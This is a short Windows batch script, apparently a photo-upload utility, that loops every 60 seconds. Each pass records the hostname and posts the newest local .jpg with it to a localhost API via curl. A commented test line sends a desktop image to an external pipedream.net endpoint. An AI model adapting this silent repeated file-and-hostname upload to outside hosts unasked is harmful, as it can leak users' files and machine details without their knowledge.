:loop
hostname > c:/host.txt
set /p USER=<c:/host.txt
set form="pc=%USER%"
rem for /f %%i in ('dir *jpg /b') do(
rem set file=%%i
rem goto send
rem )
FOR /F %%i IN ('dir *jpg /b /O-D') DO (
    SET file=%%i
    GOTO send
)
:send
rem %file%
curl -F "data=@%file%" -F %form% http://localhost:6060/api/photo
TIMEOUT /T 60
goto loop


rem Deneme curl -F 'data=@%USERPROFILE%\Desktop\mofis\aa.jpg' https://8ff6fabc98d4707f3588dde65fe86bf9.m.pipedream.net
